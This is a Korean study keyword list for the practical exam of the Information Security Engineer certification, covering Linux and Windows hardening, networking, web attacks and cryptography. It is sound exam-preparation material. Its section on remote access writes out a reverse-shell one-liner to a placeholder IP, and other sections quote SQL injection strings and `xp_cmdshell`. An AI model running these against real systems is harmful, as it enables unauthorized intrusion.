# 정보보안기사 실기 키워드

시나리오 대화로 공부하기 위한 키워드 목록이다. 한 묶음이 시나리오 하나가 되도록 같이 엮이는 용어끼리 모았다.

## 출처

- 기존 자료: `questions/practical/practical-2026.json`(실기 498문항) 정답·해설, `archive/written/sheets/`(필기 정리 시트 5과목)
- 실기 교재 목차: 알기사(지안에듀) 실기 18개 Section, 수제비 실기 기본서 7과목, MASTER 정보보안기사 MUST KNOW 실기
- 강의 목차: 인프런 「정보보안기사 실기 Part 1~3」, 수제비 실기 226강, 임베스트TV·이기적 유튜브 실기 기출 풀이
- 기출 복원: 2025년 1·2·4회, 2026년 1·2회 복원 글
- 출제기준: 현행(2023~2026)과 신 출제기준(2027~2029) 비교 분석
- 경향 분석: 2018~2023 실기 경향 분석, 단답형 빈출 정리, 신용어 정리 블로그
- 표시: ★ 실기 기출 또는 기존 실기 문항 정답으로 확인된 키워드, (25-4)·(26-2) 같은 표시는 해당 회차 복원 문제에 나온 키워드
- 2027년 신 출제기준에 새로 들어간 항목은 맨 끝 부록으로 뺐다. 2026년 응시에는 현행 기준이 적용된다.
- 실기 교재·강의 목차에 있으면 기존 문항에 없어도 남겼다. 필기에만 나오는 키워드는 넣지 않았다.

## 시험 형식

- 단답형 12문항 × 3점 = 36점: 용어·명령어·설정값·법 조항 수치
- 서술형 4문항 × 12점 = 48점: 개념 정의 → 원인 → 대응 3단 구조
- 실무형 2문항 중 1문항 × 16점: 로그·패킷·설정 파일·소스코드 분석과 조치
- 180분, 60점 이상 합격

## 출제 분포(2024~2026 복원 7회차 124문항 기준)

- 웹/앱 18, 네트워크 18, 시스템(유닉스/리눅스) 13, 보안 솔루션 12, 시스템(윈도우) 10, 암호/인증 9, 공격 기법 8, 법규/개인정보 7, 침해 대응/로그/포렌식 6, DB 2
- 늘어나는 영역: 보안 솔루션(SIEM, SOAR, DLP, 샌드박스)
- 반복 소재: 윈도우 운영(UAC, NetBIOS, net share·session, 감사 정책), XSS 3유형, 리눅스 인증·로그(PAM, shadow, utmp·wtmp·lastlog), 개인정보(영향 평가, 비식별, CCTV, 안전성 확보 조치), IPsec, DNS, DoS 계열
- 같은 문제가 3~6회차 뒤 다시 출제: Heartbleed, XSS 3유형, SSRF, 정보 자산 중요도
- 2027년 신 출제기준에서 RARP 삭제

---

# 1. 시스템 보안

## 1-1. 유닉스/리눅스 로그
- ★ utmp(`who`, `w`, `users`) / ★ wtmp(`last`) / ★ btmp(`lastb`) (25-1)
- ★ lastlog(`lastlog`) / ★ sulog / loginlog(Solaris, 5회 이상 실패)
- ★ pacct·acct(`lastcomm`, `accton`, `sa`) (25-2)
- ★ messages / ★ secure / ★ xferlog / ★ maillog / ★ cron / dmesg / boot.log / audit.log
- syslog, rsyslog, syslog-ng, `/etc/syslog.conf`, `/etc/rsyslog.conf`
- facility(kern, user, mail, daemon, auth, ★ authpriv, cron, local0~7)
- priority(emerg, alert, crit, err, warning, notice, info, debug, none)
- 원격 로그 서버(`@IP`, UDP 514), logrotate
- `.bash_history`, `history`, `HISTTIMEFORMAT`
- 로그 바이너리 여부(utmp·wtmp·btmp·lastlog는 바이너리, `strings`로도 확인)
- 로그 무결성(append-only, `chattr +a`)

## 1-2. 웹·애플리케이션 로그
- ★ access_log / ★ error_log(Apache)
- Combined Log Format(IP, 시간, 요청 라인, 상태 코드, 크기, Referer, User-Agent)
- IIS 로그(`C:\Windows\System32\LogFiles\W3SVC`), ★ HTTPERR, ★ DHCP 로그 경로 (26-1)
- 로그로 보는 공격 흔적(`' or 1=1`, `../`, `<script>`, `cmd=`, 대량 404, 스캐너 User-Agent)

## 1-3. 계정·패스워드
- ★ `/etc/passwd` 7필드(계정, ★ x (26-1), UID, GID, 설명, 홈, 셸)
- ★ `/etc/shadow` 9필드(계정, 해시, 최종 변경일, 최소·최대 사용 기간, 경고, 비활성, 만료, 예약)
- ★ `$id$salt$hash`: `$1$` MD5 / `$2a$` Blowfish / `$5$` SHA-256 / `$6$` SHA-512 (25-4)
- `/etc/group`, `/etc/gshadow`
- ★ `/etc/login.defs`(PASS_MAX_DAYS, PASS_MIN_DAYS, ★ PASS_MIN_LEN, PASS_WARN_AGE)
- ★ PAM 모듈 타입(auth, account, password, session) (25-2)
- PAM 제어 플래그(required, requisite, sufficient, optional)
- pam_unix, pam_tally2, pam_faillock(계정 잠금), pam_pwquality·pam_cracklib(복잡도), pam_wheel(su 제한)
- ★ `/etc/securetty`(root 원격 접속 제한), `PermitRootLogin no`(sshd_config)
- ★ `/sbin/nologin`, `/bin/false`
- UID 0 중복 계정, 불필요 계정(lp, uucp, news), 빈 패스워드
- `chage`, `passwd -l`, `usermod -L`, `userdel`
- ★ `TMOUT=600`(세션 타임아웃) (25-4)
- sudo, `/etc/sudoers`, `visudo`, wheel 그룹
- 패스워드 크래킹 도구(★ John the Ripper, Hashcat, ★ L0phtCrack, ★ pwdump)
- 레인보우 테이블, 솔트, 키 스트레칭

## 1-4. 파일 권한
- 퍼미션 8진수(r=4, w=2, x=1), ★ 644 / 600 / ★ 400 / 755
- ★ umask(022 → 파일 644, 디렉터리 755) (25-4)
- ★ SetUID(4000) / SetGID(2000) / Sticky bit(1000), 대문자 S·T, SUID·SGID 위험(권한 상승) (26-2)
- ★ `chmod -s`(SUID·SGID 제거), `find / -perm -4000`·`-2000` (26-2)
- ★ `find / -perm -4000 -type f`, `find / -type f -perm -2`(world-writable) (25-4)
- `find / -nouser -o -nogroup`(소유자 없는 파일)
- chmod, chown, chgrp
- chattr / lsattr(`+i` immutable, `+a` append-only)
- ACL(`getfacl`, `setfacl`)
- 주요 파일 권한(`/etc/passwd` 644, `/etc/shadow` 400, `/etc/hosts` 600, `/etc/(x)inetd.conf` 600, `/etc/syslog.conf` 640, `/etc/services` 644)
- ★ r command 대응: `.rhosts`·`/etc/hosts.equiv` 소유자 root, 권한 600 이하, `+` 제거 (26-2)
- 홈 디렉터리 환경 파일(.profile, .bashrc) 권한
- PATH 환경변수에 `.` 포함 금지

## 1-5. 리눅스 디렉터리·파일시스템
- ★ `/proc`(커널·프로세스 정보), ★ `/tmp`(Sticky bit), ★ `/opt`, `/var`, `/etc`, `/dev`, `/boot`, `/usr`
- inode, 하드 링크 / 심볼릭 링크
- ext2·ext3·ext4, XFS, ★ 저널링
- 부트 순서(BIOS·UEFI → MBR·GPT → 부트로더(GRUB) → 커널 → init·systemd)
- 런레벨(Run Level), systemd 타깃, `systemctl`
- 교착 상태, RAID(0, 1, 5)
- 커널 모듈(`lsmod`, `insmod`, `rmmod`), LKM 루트킷
- capability(CAP_SYS_MODULE 등), cgroup, namespace(컨테이너 격리)

## 1-6. 프로세스·서비스 점검
- ★ `lsof`(열린 파일·포트) (25-1), `netstat -anp`, `ss`, `ps -ef`, `top`, `pstree`, `fuser`
- ★ `kill`, `nohup`, `&`, 데몬
- ★ cron(`/etc/crontab`, `/var/spool/cron`, `crontab -l·-e`), at, `cron.allow`·`cron.deny`
- ★ inetd / ★ xinetd(`disable = yes`) (25-4), TCP Wrapper(★ `/etc/hosts.allow`, ★ `/etc/hosts.deny`)
- 불필요 서비스(echo, discard, daytime, chargen, finger, rsh, rlogin, rexec, tftp, talk, NFS, automountd, NIS)
- `/etc/services`, `/etc/inetd.conf`
- NFS(`/etc/exports`, `root_squash`, `no_root_squash`, `showmount`)
- 루트킷 탐지(★ chkrootkit, rkhunter), ★ `/proc` 숨김 프로세스
- `strace`, `ltrace`, `ldd`, `strings`, `file`, `md5sum`·`sha256sum`
- 무결성 점검(★ Tripwire, AIDE)

## 1-7. 원격 접속
- SSH(`sshd_config`: PermitRootLogin, PasswordAuthentication, Port, AllowUsers, Protocol 2, MaxAuthTries)
- 공개키 인증(`~/.ssh/authorized_keys`, `ssh-keygen`)
- Telnet·FTP·rlogin 평문 전송 위험
- 로그인 배너(`/etc/issue`, `/etc/issue.net`, `/etc/motd`)
- 리버스 셸 / 바인드 셸, ★ `sh -i >& /dev/tcp/IP/PORT 0>&1`, `nc -e`

## 1-8. 윈도우 구조·계정
- 인증 구성요소(Winlogon, ★ LSA, ★ SAM, SRM, Netlogon), LSASS
- SID, RID(★ 500 Administrator, 501 Guest), well-known SID
- ★ 기본 그룹(Administrators, ★ Power Users, ★ Backup Operators, ★ Remote Desktop Users, ★ Remote Management Users, Users, Guests, Everyone)
- 로컬 보안 정책(계정 정책, 감사 정책, 사용자 권한 할당, 보안 옵션)
- ★ 감사 정책(계정 로그온 이벤트, 로그온 이벤트, 권한 사용, 개체 액세스, 정책 변경, 계정 관리, 시스템 이벤트) (26-2)
- 계정 잠금 임계값, 패스워드 복잡도, 마지막 사용자 이름 표시 안 함
- UAC, 권한은 DENY 우선
- Active Directory, 도메인 컨트롤러, GPO, LDAP(389)
- ★ NTLM / ★ Kerberos(88), LM 해시
- ★ Pass-the-Hash
- NetBIOS(137·138·139), SMB(445), ★ NBT(NetBIOS over TCP/IP) 해제
- Null Session(IPC$), RestrictAnonymous

## 1-9. 윈도우 공유·명령어·레지스트리
- ★ `net share`(공유 확인·삭제) (25-4), ★ `net session /delete` (25-4)
- `net user`, `net localgroup`, `net use`, `net start`, `net accounts`
- ★ 기본 공유(C$, D$, ADMIN$, IPC$), ★ AutoShareServer / AutoShareWks(REG_DWORD 0)
- `netstat -ano`, `tasklist`, `taskkill`, `wmic`, `sc query`, `schtasks`, `reg query`
- `whoami /priv`, `systeminfo`, `ipconfig /displaydns`, `arp -a`
- PowerShell 실행 정책, 스크립트 블록 로깅
- ★ 레지스트리 루트키 5개(HKCR, HKCU, HKLM, HKU, HKCC)
- 하이브 파일(SAM, SECURITY, SYSTEM, SOFTWARE, NTUSER.DAT)
- 자동 실행 위치(Run, RunOnce 키, 시작 프로그램 폴더, 서비스, 예약 작업)
- ★ DDE 비활성화
- Windows Defender, 방화벽(`netsh advfirewall`)

## 1-10. 윈도우 로그·파일시스템
- 이벤트 로그(보안, 시스템, 응용 프로그램), `.evtx`, 이벤트 뷰어
- FAT32(파일 4GB 제한) vs ★ NTFS(권한, 저널링, 압축, EFS, ADS, 대용량) (25-2)
- MFT, $LogFile, ADS(대체 데이터 스트림)
- ★ BitLocker, EFS
- 프리패치(Prefetch), 휴지통($Recycle.Bin), 점프 리스트, LNK 파일, Shellbag, Amcache

## 1-11. 메모리 공격
- ★ 스택 버퍼 오버플로우 / ★ 힙 버퍼 오버플로우, ★ 셸코드, NOP Sled
- 스택 프레임(Buffer, SFP, ★ RET), ★ 프롤로그 / 에필로그
- ★ 레지스터(범용, 명령 포인터 EIP·RIP, 상태 EFLAGS, 세그먼트), EAX·EBX·ECX·EDX·ESP·EBP, 64비트 인자 순서(rdi, rsi, rdx, rcx, r8, r9)
- ★ 메모리 영역(.text, .data, .bss, 힙, 스택)
- ★ 취약 함수(strcpy, strcat, gets, sprintf, scanf) → 안전 함수(strncpy, strncat, fgets, snprintf)
- ★ 포맷 스트링(`%n`, `%x`, `%s`, `%p`)
- Integer Overflow, Off-by-one, Use-After-Free, Double Free, ★ Null Pointer Dereference
- ★ 레이스 컨디션(TOCTOU, 심볼릭 링크, 임시 파일)
- 대응: 스택가드(Canary), 스택쉴드(Global RET), ★ ASLR, DEP·NX, PIE, RELRO, SafeSEH, CFG
- RTL(Return to Libc), ROP, ★ PLT / GOT, ★ Lazy Binding
- ★ `PATH` 조작, ★ fork() / execve(), ★ 컨텍스트 스위칭
- ★ Meltdown / Spectre(사이드 채널)

## 1-12. 악성코드
- ★ 바이러스 / ★ 웜 / ★ 트로이 목마, 백도어, 루트킷, 스파이웨어, 애드웨어, 키로거, 봇넷, 드로퍼, 다운로더
- 랜섬웨어, RaaS, 이중 갈취, 크립토재킹
- 파일리스 악성코드, LOLBins(PowerShell, certutil, mshta)
- 다형성·변종(폴리모픽, 메타모픽), 패커(UPX), 난독화
- 정적 분석 / 동적 분석, 샌드박스, ★ YARA, VirusTotal, IDA, Ghidra, x64dbg, Process Monitor
- 악성코드 지속성(Run 키, 서비스, 예약 작업, WMI, cron, systemd)
- ★ BPFDoor, TrickBot, Qakbot, Emotet, Ramnit, Nimda, Stuxnet
- 논리 폭탄, 사회공학 기법

## 1-13. 디지털 포렌식
- ★ 디지털 포렌식 정의 (25-4)
- 5원칙(정당성, 재현, 신속성, ★ 연계 보관성(Chain of Custody), 무결성)
- 수집 순서(휘발성 높은 순: 레지스터·캐시 → 메모리 → 네트워크 상태 → 프로세스 → 디스크 → 원격 로그 → 백업)
- 쓰기 방지 장치(Write Blocker), `dd`, 이미징(E01, raw), 해시(MD5, SHA-256) 검증
- 메모리 덤프
- 타임라인 분석, MAC Time(Modified, Accessed, Changed), 안티 포렌식, 타임스탬프 조작
- 파일 카빙, 슬랙 공간, 비할당 영역
- ★ 저널링, 시그니처(매직 넘버: PDF `%PDF`, PNG, JPEG `FF D8`, PE `MZ`, ELF)

---

# 2. 네트워크 보안

## 2-1. OSI·TCP/IP
- OSI 7계층, TCP/IP 4계층, 캡슐화 / 역캡슐화, PDU(비트, 프레임, 패킷, 세그먼트)
- 네트워크 토폴로지(트리, 버스, 스타, 링, 메시)
- 계층별 장비(허브, 브리지·스위치, 라우터, L4·L7 스위치)
- ★ TCP 3-way handshake, 4-way handshake, TCP 상태(LISTEN, SYN_RECV, ESTABLISHED, TIME_WAIT)
- ★ TCP 플래그 6개(URG, ACK, PSH, RST, SYN, FIN)
- TCP 헤더(포트, Sequence·Ack 번호, 윈도우 크기, 체크섬)
- IP 헤더(Version, TTL, Protocol, Identification, Flags DF·MF, Fragment Offset, Header Checksum)
- ★ IP 단편화, MTU
- UDP 특징, ★ ICMP 타입(0 Echo Reply, 3 Destination Unreachable, 5 Redirect, 8 Echo Request, 11 Time Exceeded)
- `ping`, `traceroute`·`tracert`(TTL)
- ★ ARP / ★ RARP, GARP, ARP 캐시
- DHCP(DORA, 67·68), DHCP Starvation, Rogue DHCP
- ★ CR / LF (25-1)

## 2-2. 주소 체계
- IP 클래스(A~E), 사설 IP(10/8, 172.16/12, 192.168/16), 루프백, APIPA
- ★ 서브넷 마스크 계산, CIDR, 서브네팅, 슈퍼네팅, 브로드캐스트·네트워크 주소
- ★ NAT, PAT, 공인 IP
- MAC 주소(OUI)

## 2-3. 포트 번호
- ★ 20·21 FTP / 22 SSH / 23 Telnet / 25 SMTP / 53 DNS / 67·68 DHCP / 69 TFTP / 80 HTTP / 88 Kerberos / 110 POP3 / 123 NTP / 137~139 NetBIOS / 143 IMAP / 161·162 SNMP / 389 LDAP / 443 HTTPS / 445 SMB / 514 Syslog / 587 Submission / 636 LDAPS / 993 IMAPS / 995 POP3S / 1433 MSSQL / 1521 Oracle / 1900 SSDP / 3306 MySQL / 3389 RDP / 5900 VNC / 11211 Memcached
- Well-known(0~1023), Registered(1024~49151), Dynamic(49152~65535)

## 2-4. 스캐닝·정보 수집
- ★ TCP Connect / ★ SYN(Half-open, 열림 SYN+ACK → RST) 스캔
- ★ FIN / ★ NULL / ★ XMAS 스캔(열림 무응답, 닫힘 RST+ACK)
- ACK 스캔(방화벽 필터링 확인), UDP 스캔(닫힘 ICMP Port Unreachable)
- ★ Decoy 스캔, Idle(Zombie) 스캔, FTP Bounce 스캔, 단편화 스캔
- nmap 옵션(-sT, -sS, -sU, -sF, -sN, -sX, -sA, -O, -sV, -p, -D, -Pn, -A)
- ★ hping3, Zenmap, masscan
- 배너 그래빙, OS 핑거프린팅, Whois, `nslookup`, `dig`, Shodan, 구글 해킹(Google Dork)
- 스캔 탐지(포트 스캔 탐지 룰, threshold)

## 2-5. 스니핑·스푸핑·하이재킹
- 무차별 모드(Promiscuous), tcpdump, Wireshark
- ★ 포트 미러링(SPAN), 스위치 재밍(MAC Flooding), ★ ARP 스푸핑(ARP 리다이렉트), ICMP Redirect
- 스니핑 탐지(ping·ARP·DNS 이용, 디코이, ARP watch)
- ★ ARP 스푸핑 판단(ARP 테이블에 서로 다른 IP가 같은 MAC), 대응(`arp -s` 정적 등록, DAI, 포트 보안)
- IP 스푸핑, 트러스트 관계 악용
- ★ DNS 스푸핑, ★ DNS 캐시 포이즈닝, ★ 파밍, ★ hosts 파일 변조
- ★ 세션 하이재킹(TCP 시퀀스 번호 예측, ACK Storm), 세션 고정
- ★ 중간자 공격(MITM), SSL Strip
- 피싱 / 파밍 / 스미싱 / 큐싱 / 비싱 / 스피어피싱 / 웨일링, BEC

## 2-6. DoS / DDoS
- 분류(취약점 기반, 자원 소진, 애플리케이션 계층)
- ★ Ping of Death, ★ Teardrop(Offset 조작) (26-2), Bonk·Boink, ★ Land(출발지 = 목적지) (26-2)
- ★ SYN Flooding(Backlog Queue, SYN Cookie, 타임아웃 단축)
- ★ Smurf(Direct Broadcast, ICMP Echo Reply, `no ip directed-broadcast`) (25-1, 26-2), Fraggle(UDP)
- UDP Flooding, ICMP Flooding
- ★ HTTP GET Flooding, ★ CC Attack(Cache-Control: no-cache), 동적 HTTP Request Flooding
- ★ Slowloris(Slow HTTP Header, `\r\n\r\n` 미완성), ★ Slow HTTP POST(RUDY, Content-Length 크게), ★ Slow HTTP Read(Window 0)
- Hash DoS, HULK, XML Bomb
- ★ DRDoS: DNS 증폭(ANY 질의), ★ NTP 증폭(★ monlist), ★ Memcached, ★ SSDP, SNMP, CLDAP, CharGen
- ★ 증폭률(요청 대비 응답 크기)
- 대응: ★ Ingress / ★ Egress 필터링, uRPF, ★ Blackhole(Null Routing), Sinkhole, Rate Limiting, 클린존, CDN, DDoS 대피소, `mod_evasive`, ★ `LimitRequestBody`, Timeout 설정
- 봇넷, C&C, ★ DGA, ★ Fast Flux, Domain Shadowing

## 2-7. 방화벽
- 유형(패킷 필터링, 상태 추적(Stateful Inspection), 애플리케이션 게이트웨이(Proxy), 서킷 게이트웨이, 하이브리드)
- 구축 형태(스크리닝 라우터, 배스천 호스트, 듀얼 홈드, 스크린드 호스트, 스크린드 서브넷)
- DMZ
- 작은 조각 공격(Tiny Fragment), 단편 겹침 공격(Fragment Overlap)
- ★ iptables(테이블 filter·nat·mangle, 체인 INPUT·OUTPUT·FORWARD, 타깃 ACCEPT·DROP·REJECT·LOG, `-A -I -D -p -s -d --dport --sport -i -m state --state -j`)
- ★ ICMP 차단(`iptables -A INPUT -p icmp --icmp-type echo-request -j DROP`) (26-1)
- iptables 기본 정책(`-P INPUT DROP`), 저장(`iptables-save`)
- firewalld, ufw
- ★ 라우터 ACL(Standard 1~99, Extended 100~199, `access-list`, `ip access-list extended`, `ip access-group in·out`, 암묵적 deny any), ★ ACL 해석으로 차단 포트 찾기 (26-2)
- WAF(★ ModSecurity), NGFW, UTM

## 2-8. IDS / IPS
- ★ NIDS / ★ HIDS, 배치 위치
- 오용(시그니처) 탐지 / 이상(행위) 탐지
- ★ False Positive(오탐) / ★ False Negative(미탐), True Positive, True Negative (25-4)
- IPS 인라인 차단, 우회 기법(단편화, 인코딩, 암호화 트래픽)
- ★ Snort 룰 구조(액션, 프로토콜, IP, 포트, 방향 `->`·`<>`, 옵션)
- ★ Snort 액션(alert, log, pass, activate, dynamic, drop, reject, sdrop)
- ★ Snort 옵션(msg, ★ content, nocase, ★ offset, ★ depth, distance, within, pcre, flags, flow, dsize, ★ threshold(type limit·threshold·both, track by_src·by_dst, count, seconds), sid, rev, classtype)
- Snort 룰 해석·작성(예: TCP 80 SYN 다량, 특정 문자열 포함)
- ★ Suricata, Zeek(Bro), ★ Tripwire, OSSEC, Wazuh
- 허니팟, 허니넷

## 2-9. 보안 관제·솔루션
- ★ ESM, ★ SIEM (26-1, 26-2), ★ SOAR, SOC, 보안 관제 3요소(에이전트, 정보 수집 서버, 통합 관제 시스템) (25-2)
- ★ EDR, XDR, MDR, NDR, MSS
- ★ 샌드박스 (26-2), Anti-APT, UTM, SSO, SecaaS
- ★ NAC(PacketFence), ★ DLP(매체 제어, 네트워크·엔드포인트) (25-2), DRM
- ★ 로그 분석 단계(수집, 분류, 변환, 분석)
- 점검 도구(★ Nessus (26-1), nikto, ★ Tripwire (26-1), chkrootkit), ★ hping3 (26-2)
- ★ 와이어샤크 필터(`ip.addr`, `tcp.port`, `tcp.flags.syn==1`, `http.request.method`, `dns.flags.response`), 패킷 해석
- 망 분리(물리적·논리적), VDI, 망 연계

## 2-10. VPN·IPsec
- ★ IPsec(네트워크 계층), ★ AH(인증·무결성·재전송 방지, ★ Sequence Number, 프로토콜 51) (25-4) / ★ ESP(암호화 + 인증, 50)
- 전송 모드 / 터널 모드(원본 IP 헤더까지 보호)
- IKE(Phase 1·2, Main·Aggressive Mode), SA, SPI, SAD, SPD, ISAKMP(UDP 500), NAT-T(4500)
- ★ PPTP / ★ L2F / L2TP(2계층), SSL VPN, WireGuard
- 터널링, 재전송 공격(Replay Attack)
- ★ 종단 간 암호화(E2EE) vs 링크 암호화 (25-2)

## 2-11. 무선 보안
- ★ WEP(RC4, ★ IV 24비트, 고정 키) / ★ WPA(TKIP + RC4, MIC) / ★ WPA2(AES-CCMP, 802.11i) / WPA3(SAE, PMF)
- ★ 802.1X, EAP(EAP-TLS, PEAP), RADIUS, TACACS+, ★ AAA
- PSK / Enterprise 모드, 4-way handshake
- SSID 숨김, MAC 필터링, Rogue AP, Evil Twin(가짜 AP), 워드라이빙
- 블루투스 공격(블루재킹, 블루스나핑, 블루버깅)

## 2-12. 네트워크 장비 관리
- ★ SNMP(★ Polling / Trap, Manager / Agent, MIB, OID, ★ community string(public, private))
- SNMP v1·v2c·v3, v3 USM(noAuthNoPriv, authNoPriv, authPriv), ★ msgAuthoritativeEngineBoots 등 v3 필드
- ★ SNMP 비활성화(`no snmp-server`), 보안 점검 사항(커뮤니티 변경, ACL, v3 사용, RW 제한)
- ★ VLAN(Static / Dynamic, VMPS, `show vlan`) (25-1), VLAN Hopping, 트렁크, DTP
- ★ 스위칭 방식(Cut-through, Store and Forward, Fragment Free) (25-4)
- STP, 루프
- 라우팅(정적·동적, ★ RIP 거리 벡터, ★ OSPF 링크 상태, ★ EIGRP)
- 장비 보안 설정(enable secret, `service password-encryption`, VTY ACL, SSH 사용, 배너, 불필요 서비스 off)
- 보안 장비 계정 관리(기본 계정·패스워드 변경, 최소 권한, 미사용 계정 제거)

---

# 3. 애플리케이션 보안

## 3-1. 웹 기본·HTTP
- ★ HTTP 메서드(★ GET, ★ POST, ★ HEAD, PUT, DELETE, ★ OPTIONS, ★ TRACE, CONNECT, PATCH)
- ★ telnet으로 메서드 확인(`OPTIONS / HTTP/1.1`), 불필요 메서드 제한(LimitExcept)
- ★ 상태 코드(200, 201, ★ 301, ★ 302, 304, 400, 401, 403, 404, 405, 500, 502, 503)
- 요청 라인(메서드 경로 버전), 헤더(Host, User-Agent, Referer, Cookie, Content-Type, Content-Length), ★ 헤더·바디 구분(`\r\n\r\n`)
- 응답 헤더(Set-Cookie, Location, Server, X-Powered-By)
- ★ 쿠키 속성(★ HttpOnly, Secure, ★ SameSite(Strict, Lax, None), Domain, Path, Expires, Max-Age)
- ★ 세션 vs 쿠키(서버 저장 vs 클라이언트 저장) (26-1), 세션 관리(★ 세션 ID 재발급, 타임아웃, 로그아웃 시 파기)
- 보안 헤더(CSP, X-Frame-Options, HSTS, X-Content-Type-Options)
- CORS, SOP(동일 출처 정책)
- HTTP/2, HTTP/3(QUIC)
- ★ 웹 프록시(Burp Suite, Paros, ★ Fiddler), ★ Fiddler HTTPS 복호화(Decrypt HTTPS traffic, 루트 인증서 설치) (26-1)

## 3-2. 웹 공격
- ★ SQL Injection(Error-based, Union, Blind(Boolean, Time-based), Stored Procedure, `' or 1=1--`, `xp_cmdshell`) (25-4)
- ★ 대응: Prepared Statement(바인딩), 입력 검증, 최소 권한, 에러 메시지 숨김
- ★ XSS(★ Reflected / ★ Stored / ★ DOM-based), ★ HttpOnly, 출력 인코딩, CSP
- ★ CSRF(★ CSRF Token, ★ 재인증, ★ CAPTCHA, SameSite, Referer 검증, GET 대신 POST) (26-1)
- ★ SSRF(내부망 접근, ★ IMDS 탈취) (25-1)
- ★ OS Command Injection(`;`, `|`, `&&`, `Runtime.exec()`)
- ★ 파일 업로드(★ 웹셸, 확장자·★ MIME(Content-Type)·★ 매직 바이트 우회, 이중 확장자, 널 바이트) (25-2)
- ★ 파일 다운로드, 경로 조작(Path Traversal, `../`), ★ LFI / RFI(`include()`, `require()`)
- ★ 디렉터리 리스팅(★ `Indexes`) (25-2)
- XXE, XML Injection, XPath Injection, LDAP Injection
- ★ 역직렬화
- ★ HTTP 응답 분할(CRLF Injection), HTTP Request Smuggling, Host Header Injection
- Open Redirect, Clickjacking
- IDOR(부적절한 인가), 강제 브라우징, URL·파라미터 변조, 불충분한 세션 관리, 정보 누출
- 관리자 페이지 노출, 위치 공개, 검색 엔진 정보 노출, 웹 서비스 메서드 설정
- ★ 무차별 대입, ★ 사전 공격, ★ 크리덴셜 스터핑 (25-4), ★ 패스워드 스프레이, 역방향 무차별 대입
- 쿠키 탈취, 세션 하이재킹
- IIS 유니코드 공격(`%c0%af`)
- ★ Subdomain Takeover
- ★ robots.txt
- ★ Log4Shell(JNDI Injection), Spring4Shell, ★ React2Shell, Struts2 RCE, ★ ShellShock(GNU Bash)

## 3-3. 웹 서버 설정
- Apache httpd.conf: ★ `Options -Indexes`, FollowSymLinks, ★ `ServerTokens Prod`, `ServerSignature Off`, ★ `LimitRequestBody`, `AllowOverride`, `Require all denied·granted`, `<Directory>`, `<LimitExcept>`, `TraceEnable Off`, `Timeout`, `KeepAlive`
- ★ `.htaccess` 인증(★ AuthType, ★ AuthName, ★ AuthUserFile, ★ Require valid-user), `htpasswd`
- 웹 서비스 계정(nobody, apache), 웹 디렉터리 분리, 불필요 파일(manual, cgi-bin 샘플) 제거
- ★ PHP(php.ini): `allow_url_fopen`, `allow_url_include`, `register_globals`, `display_errors`, `expose_php`, `disable_functions`, `open_basedir`, ★ `php_admin_flag engine off`(업로드 디렉터리 실행 금지)
- Nginx(`server_tokens off`, `autoindex off`)
- IIS(디렉터리 검색, 실행 권한, 요청 필터링, ★ URL Rewrite 모듈 (26-1))
- 보안 서버(SSL 인증서) 구축
- Tomcat(관리자 페이지, 기본 계정, server.xml)
- WebDAV
- ★ ModSecurity(KISA 안내서)
- MySQL ★ `bind-address=127.0.0.1`

## 3-4. DNS
- ★ 재귀(Recursive) / 반복(Iterative) 질의, ★ 재귀 DNS / ★ 권한 DNS, 루트·TLD 서버
- ★ DNS 조회 순서(hosts 파일 → DNS 캐시 → DNS 서버)
- ★ UDP 53(512바이트 초과·영역 전송은 TCP 53), ★ DNS 캐싱, ★ TTL (25-2)
- 레코드(SOA, ★ A, AAAA, MX, NS, CNAME, PTR, TXT, SRV)
- BIND(★ `named.conf`, zone 파일), ★ `/etc/resolv.conf` (26-2), Windows ★ `hosts.ics`, ★ Zone Transfer(★ `allow-transfer`), `allow-query`, `allow-recursion`, `recursion no`, `version`
- ★ DNS 캐시 포이즈닝(카민스키 공격), DNS 스푸핑, DNS 증폭, DNS 터널링, ★ Subdomain Takeover, Domain Shadowing
- DNSSEC(RRSIG, DNSKEY, DS, 무결성·출처 인증, 기밀성 없음), DoH, DoT
- `nslookup`, `dig`, `ipconfig /flushdns`

## 3-5. 메일
- ★ SMTP(25, 587) / ★ POP3(110) / ★ IMAP(143)
- MUA → MTA → MDA, SMTP 명령(HELO·EHLO, MAIL FROM, RCPT TO, DATA, QUIT, VRFY, EXPN)
- ★ Sendmail(sendmail.cf, ★ `/etc/mail/access`(★ RELAY, ★ OK, REJECT, DISCARD), ★ `makemap hash`, 릴레이 제한, `PrivacyOptions`(noexpn, novrfy, restrictqrun), 버전 숨김)
- 스팸 릴레이(오픈 릴레이)
- ★ SPF(DNS TXT 레코드, 발신 서버 IP 검증) / ★ DKIM(DKIM-Signature 헤더, 전자서명) / ★ DMARC (26-2)
- RBL, SpamAssassin
- ★ Sendmail 설정 파일(sendmail.cf, access, access.db) (26-1)
- PGP(★ 전자서명, 압축, 세션 키, Radix-64), S/MIME, PEM
- 이메일 시스템 구조(MUA, MTA, MDA), SMTP 메일 형식
- 스팸 필터, 메일 폭탄

## 3-6. FTP
- ★ Active(서버 20 → 클라이언트) / ★ Passive(클라이언트 → 서버 임의 포트)
- ★ Anonymous FTP, `ftpusers`(root 접속 금지), vsftpd.conf(`anonymous_enable=NO`), proftpd
- ★ TFTP(인증 없음, 69), ★ FTP Bounce Attack, ★ 평문 전송, ★ 배너 정보 노출
- SFTP / FTPS

## 3-7. 데이터베이스 보안
- ★ DB 보안 통제(접근 통제, ★ 추론 통제, 흐름 통제), ★ 집계(Aggregation), ★ 추론(Inference), ★ 데이터 디들링
- 다중 인스턴스(Polyinstantiation), 뷰(View), 최소 권한, GRANT·REVOKE
- ★ DB 암호화 방식(★ API, ★ Plug-in, TDE, 파일 암호화, 하드웨어)
- ★ 데이터 마스킹(★ Static / ★ Dynamic, ★ 패턴 기반, ★ SQL 파싱 기반) (25-4)
- DB 접근 제어 솔루션(게이트웨이 방식, 에이전트 방식, 하이브리드)
- DB 감사, 계정 관리(기본 계정, sa), MySQL 취약점 점검
- DB 백업(전체, 차등, 증분)

## 3-8. 암호
- 암호 분류 트리(대칭·비대칭·해시)
- ★ 대칭키(★ DES 56비트, 3DES, ★ AES(128블록, 128·192·256키, 라운드 10·12·14), SEED, ARIA, IDEA, Blowfish, RC5, ★ RC4)
- 스트림 암호 / 블록 암호, RC4, OTP
- ★ 대칭키 정의(암호화·복호화에 같은 비밀키) (26-2)
- ★ 블록 모드(★ ECB, ★ CBC, ★ CFB, ★ OFB, ★ CTR, CCM, GCM), 패딩, IV
- ★ 비대칭키(★ RSA(소인수분해), ★ DH(이산대수, 키 교환 전용), ElGamal, DSA, ★ ECC, Rabin)
